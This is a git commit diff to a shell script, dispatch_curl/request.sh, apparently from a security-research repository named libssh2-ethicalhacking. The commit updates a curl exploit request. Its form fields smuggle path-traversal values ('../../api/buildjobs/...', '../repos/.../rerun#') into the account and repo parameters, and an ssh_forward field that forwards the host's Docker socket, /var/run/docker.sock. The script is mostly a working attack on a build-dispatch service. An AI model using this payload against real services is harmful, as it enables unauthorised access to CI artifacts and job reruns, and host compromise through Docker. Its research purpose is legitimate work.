f6fdd2bf8eecc6f5c707cecfa80c2b943aa34cb5
structix <janek@schoff.it>
2024-08-17 17:24:37 +0200

    Update dispatch curl

--- dispatch_curl/request.sh
+++ dispatch_curl/request.sh
@@ -1,12 +1,12 @@
 curl \
-  -F "account=../../api/buildjobs/sxpk742opqxhor28/artifacts/temperature_converter_example%2Fpayload.json?stream=true#" \
+  -F "account=../../api/buildjobs/uwslrubaa7ve8vdq/artifacts/temperature_converter_example%2Fpayload.json?stream=true#" \
   -F "project=libssh2-ethicalhacking" \
   -F "buildid=1337" \
   -F "base=main" \
   -F "hash=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa" \
-  -F "repo=../repos/STRUCTiX/libssh2-ethicalhacking/actions/jobs/10239701797/rerun#" \
+  -F "repo=../repos/STRUCTiX/libssh2-ethicalhacking/actions/jobs/10239836102/rerun#" \
   -F "ssh_host=127.0.0.1" \
-  -F "ssh_port=22" \
+  -F "ssh_port=2222" \
   -F "ssh_user=test" \
   -F "ssh_forward=127.0.0.1:22 127.0.0.1:22,127.0.0.1:2375 /var/run/docker.sock" \
   -F "ssh_hostkey=asdf" \
